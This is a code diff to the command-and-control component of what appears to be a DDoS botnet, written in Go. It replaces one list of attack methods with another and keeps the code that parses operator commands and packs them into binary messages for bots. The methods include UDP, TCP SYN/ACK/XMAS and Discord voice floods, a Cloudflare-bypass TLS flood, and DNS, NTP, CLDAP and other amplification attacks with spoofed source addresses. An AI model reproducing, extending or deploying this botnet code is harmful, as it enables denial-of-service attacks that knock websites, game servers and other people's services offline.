@@ -10,14 +10,6 @@ import (
 	"github.com/mattn/go-shellwords"
 )
 
-/* ============================================================================
- * ATTACK PARSER & BUILDER - 16 Attack Methods
- * ============================================================================
- * Layer 4: TCP, UDP, ICMP, GRE, OVH bypass, Amplification
- * Layer 7: HTTP flood, AXIS-L7 (browser emulation + CF bypass)
- * Combined: AXIS-TCP, AXIS-UDP (multi-vector attacks)
- * ============================================================================ */
-
 type AttackInfo struct {
 	attackID          uint8
 	attackFlags       []uint8
@@ -36,75 +28,64 @@ type FlagInfo struct {
 	flagDescription string
 }
 
-var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
-	"len":       FlagInfo{0, "Size of packet data, default is 1400 bytes"},
-	"rand":      FlagInfo{1, "Randomize packet data content, default is 1 (yes)"},
-	"tos":       FlagInfo{2, "TOS field value in IP header, default is 0"},
-	"ident":     FlagInfo{3, "ID field value in IP header, default is random"},
-	"ttl":       FlagInfo{4, "TTL field value in IP header, default is 64"},
-	"df":        FlagInfo{5, "Set the Dont-Fragment bit in IP header, default is 0"},
-	"sport":     FlagInfo{6, "Source port, default is random"},
-	"dport":     FlagInfo{7, "Destination port, default is random"},
-	"domain":    FlagInfo{8, "Domain name to attack"},
-	"method":    FlagInfo{9, "HTTP method name, default is GET"},
-	"path":      FlagInfo{11, "HTTP path, default is /"},
-	"conns":     FlagInfo{12, "Number of connections"},
-	"source":    FlagInfo{13, "Source IP address, 255.255.255.255 for random"},
-	"url":       FlagInfo{14, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
-	"https":     FlagInfo{15, "Use HTTPS/SSL (0 or 1)"},
-	"useragent": FlagInfo{16, "User-Agent string for HTTP requests"},
-	"cookies":   FlagInfo{17, "Cookies for HTTP requests (for CF bypass)"},
-	"referer":   FlagInfo{18, "Referer header for HTTP requests"},
-	"size":      FlagInfo{0, "Size of packet data (alias for len)"},
-	"port":      FlagInfo{7, "Destination port (alias for dport)"},
-	/* AXIS-TCP/AXIS-UDP specific flags */
-	"tcpport":   FlagInfo{19, "TCP port for AXIS-TCP"},
-	"udpport":   FlagInfo{20, "UDP port for AXIS-UDP"},
-	"greport":   FlagInfo{21, "GRE port for AXIS-TCP/AXIS-UDP"},
-	/* HTTP path for domain attacks */
-	"httppath":  FlagInfo{22, "HTTP path for domain attacks"},
-	/* New flags for improved attacks - FUTURE IMPROVEMENTS */
-	"fragment":  FlagInfo{23, "Enable IP fragmentation (0 or 1)"},
-	"mss":       FlagInfo{24, "TCP MSS option value (536, 1460, 2048, 4096, 8192)"},
-	"wscale":    FlagInfo{25, "TCP window scale value (0-8)"},
-	"timestamp": FlagInfo{26, "Enable TCP timestamps (0 or 1)"},
-	"adaptive":  FlagInfo{27, "Enable adaptive vector weighting (0 or 1)"},
-	"tlsfp":     FlagInfo{28, "TLS fingerprint profile (chrome, firefox, safari, edge)"},
-	"fprot":     FlagInfo{29, "Enable per-request fingerprint rotation (0 or 1)"},
-	/* HTTPS flag */
-	"httpsflag": FlagInfo{31, "Use HTTPS (internal flag)"},
+var flagInfoLookup = map[string]FlagInfo{
+	"len":       {0, "Size of packet data, default is 1400 bytes"},
+	"rand":      {1, "Randomize packet data content, default is 1 (yes)"},
+	"sport":     {6, "Source port, default is random"},
+	"dport":     {7, "Destination port, default is random"},
+	"domain":    {8, "Domain name to attack"},
+	"method":    {9, "HTTP method name, default is GET"},
+	"path":      {11, "HTTP path, default is /"},
+	"conns":     {12, "Number of connections"},
+	"source":    {13, "Source IP address, 255.255.255.255 for random"},
+	"url":       {14, "Full HTTP/HTTPS URL"},
+	"https":     {15, "Use HTTPS/SSL (0 or 1)"},
+	"useragent": {16, "User-Agent string for HTTP requests"},
+	"cookies":   {17, "Cookies for HTTP requests"},
+	"referer":   {18, "Referer header for HTTP requests"},
+	"size":      {0, "Size of packet data (alias for len)"},
+	"port":      {7, "Destination port (alias for dport)"},
 }
 
 /*
- * Attack method IDs - 16 optimized methods
- * Must match bot/attack.h ATK_VEC_* values
+ * Attack method IDs - Must match bot/attack.h
  */
-var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
-	/* Core Attacks */
-	"tcp":      AttackInfo{0, []uint8{0, 1, 6, 7, 13}, "TCP flood optimized for Gbps"},
-	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
-	"http":     AttackInfo{2, []uint8{7, 8, 9, 11, 12, 14}, "HTTP flood optimized for RPS"},
-	
-	/* OVH Bypass */
-	"ovhtcp":   AttackInfo{3, []uint8{0, 1, 6, 7, 13}, "TCP with OVH Game bypass"},
-	"ovhudp":   AttackInfo{4, []uint8{0, 1, 6, 7, 13}, "UDP with OVH Game bypass"},
+var attackInfoLookup = map[string]AttackInfo{
+	/* APEX 2.0 L4 Methods */
+	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
+	"game":     {1, []uint8{0, 1, 6, 7, 13}, "Game/Voice chat flood"},
+	"discord":  {2, []uint8{0, 1, 6, 7, 13}, "Discord voice flood"},
+	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},
 
-	/* ICMP & GRE */
-	"icmp":     AttackInfo{5, []uint8{0, 13}, "ICMP ping flood (no port needed)"},
-	"greip":    AttackInfo{6, []uint8{0, 1, 6, 7, 13}, "GRE IP flood"},
-	"greeth":   AttackInfo{7, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet flood"},
+	/* APEX 2.0 L7 Methods */
+	"tls":      {4, []uint8{7, 8, 9, 11, 12, 14}, "Standard TLS/HTTPS flood"},
+	"tlsplus":  {5, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Enhanced TLS flood with header randomization"},
+	"cf":       {6, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Cloudflare bypass flood"},
 
-	/* AXIS Methods */
-	"axis-l7":  AttackInfo{8, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "AXIS-L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
-	"axis-tcp": AttackInfo{9, []uint8{0, 1, 6, 7, 19, 21, 13}, "AXIS-TCP - TCP+OVH-TCP+ICMP+GRE combined attack"},
-	"axis-udp": AttackInfo{10, []uint8{0, 1, 6, 7, 20, 21, 13}, "AXIS-UDP - UDP+AMP+VSE+ICMP+GRE combined attack"},
+	/* AXIS-L7 (with proxy support merged from tlsplusbypass) */
+	"axis-l7":  {7, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Advanced L7 with HTTP CONNECT proxy support"},
 
-	/* Amplification Attacks */
-	"dns-amp":  AttackInfo{11, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
-	"ntp-amp":  AttackInfo{12, []uint8{6, 13}, "NTP Amplification (100x-500x)"},
-	"ssdp-amp": AttackInfo{13, []uint8{6, 13}, "SSDP Amplification (30x-50x)"},
-	"snmp-amp": AttackInfo{14, []uint8{6, 13}, "SNMP Amplification (50x-100x)"},
-	"cldap-amp": AttackInfo{15, []uint8{6, 13}, "CLDAP Amplification (50x-70x)"},
+	/* Amplification Methods */
+	"dns-amp":  {8, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
+	"ntp-amp":  {9, []uint8{6, 13}, "NTP Amplification (100x-500x)"},
+	"ssdp-amp": {10, []uint8{6, 13}, "SSDP Amplification (30x-50x)"},
+	"snmp-amp": {11, []uint8{6, 13}, "SNMP Amplification (50x-100x)"},
+	"cldap-amp": {12, []uint8{6, 13}, "CLDAP Amplification (50x-70x)"},
+
+	/* Layer 4 TCP Methods */
+	"syn":      {13, []uint8{0, 1, 6, 7, 13}, "TCP SYN Flood"},
+	"ack":      {14, []uint8{0, 1, 6, 7, 13}, "TCP ACK Flood"},
+	"fin":      {15, []uint8{0, 1, 6, 7, 13}, "TCP FIN Flood"},
+	"rst":      {16, []uint8{0, 1, 6, 7, 13}, "TCP RST Flood"},
+	"tcpconn":  {17, []uint8{0, 1, 6, 7, 13}, "TCP Connection Flood (Full Handshake)"},
+	"xmas":     {18, []uint8{0, 1, 6, 7, 13}, "TCP XMAS Flood (All Flags)"},
+	"null":     {19, []uint8{0, 1, 6, 7, 13}, "TCP NULL Flood (No Flags)"},
+	"window":   {20, []uint8{0, 1, 6, 7, 13}, "TCP Window Flood"},
+
+	/* Special Methods */
+	"icmp":     {21, []uint8{0, 1, 6, 7, 13}, "ICMP Flood"},
+	"greip":    {22, []uint8{0, 1, 6, 7, 13}, "GRE IP Flood"},
+	"greeth":   {23, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet Flood"},
 }
 
 func uint8InSlice(a uint8, list []uint8) bool {
@@ -127,15 +108,13 @@ func NewAttack(str string, admin int) (*Attack, error) {
 		return nil, errors.New("Invalid attack command (need method, target, duration)")
 	}
 
-	// Parse attack method
-	if atkInfo, ok := attackInfoLookup[args[0]]; !ok {
+	atkInfo, ok := attackInfoLookup[args[0]]
+	if !ok {
 		return nil, errors.New("Unknown attack method: " + args[0])
-	} else {
-		atk.Type = atkInfo.attackID
 	}
+	atk.Type = atkInfo.attackID
 
-	// Check if this is an HTTP/HTTPS attack
-	isHTTPAttack := atk.Type == 2 || atk.Type == 8  // HTTP or AXIS-L7
+	isHTTPAttack := atk.Type >= 4 && atk.Type <= 8
 
 	if isHTTPAttack {
 		targetURL := args[1]
@@ -147,16 +126,16 @@ func NewAttack(str string, admin int) (*Attack, error) {
 			}
 
 			path := extractPathFromURL(targetURL)
-			if path != "" && atk.Flags[22] == "" {
-				atk.Flags[22] = path
+			if path != "" {
+				atk.Flags[11] = path
 			}
 
 			if strings.HasPrefix(targetURL, "https://") {
-				atk.Flags[31] = "1"
+				atk.Flags[15] = "1"
 			}
 		} else {
 			atk.Flags[8] = args[1]
-			atk.Flags[22] = "/"
+			atk.Flags[11] = "/"
 		}
 
 		atk.Duration = 1
@@ -174,14 +153,13 @@ func NewAttack(str string, admin int) (*Attack, error) {
 			}
 		}
 
-		if atk.Flags[31] == "1" && atk.Flags[7] == "" {
+		if atk.Flags[15] == "1" && atk.Flags[7] == "" {
 			atk.Flags[7] = "443"
 		} else if atk.Flags[7] == "" {
 			atk.Flags[7] = "80"
 		}
 
 	} else {
-		// Parse target (IP or domain)
 		if ip := net.ParseIP(args[1]); ip != nil {
 			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
 		} else {
@@ -196,14 +174,12 @@ func NewAttack(str string, admin int) (*Attack, error) {
 			}
 		}
 
-		// Parse duration
 		if dur, err := strconv.Atoi(args[2]); err == nil {
 			atk.Duration = uint32(dur)
 		} else {
 			return nil, errors.New("Invalid duration value")
 		}
 
-		// Parse flags
 		for i := 3; i < len(args); i++ {
 			parts := strings.SplitN(args[i], "=", 2)
 			if len(parts) != 2 {
@@ -257,29 +233,22 @@ func extractPathFromURL(url string) string {
 func (this *Attack) Build() ([]byte, error) {
 	buf := make([]byte, 0)
 
-	// Append attack type
 	buf = append(buf, this.Type)
-
-	// Append target count
 	buf = append(buf, byte(len(this.Targets)))
 
-	// Append targets
 	for addr, netmask := range this.Targets {
 		buf = append(buf, byte(addr>>24), byte(addr>>16), byte(addr>>8), byte(addr))
 		buf = append(buf, netmask)
 	}
 
-	// Append flag count
 	buf = append(buf, byte(len(this.Flags)))
 
-	// Append flags
 	for key, val := range this.Flags {
 		buf = append(buf, key)
 		buf = append(buf, byte(len(val)))
 		buf = append(buf, []byte(val)...)
 	}
 
-	// Append duration
 	buf = append(buf, byte(this.Duration>>24), byte(this.Duration>>16), byte(this.Duration>>8), byte(this.Duration))
 
 	return buf, nil
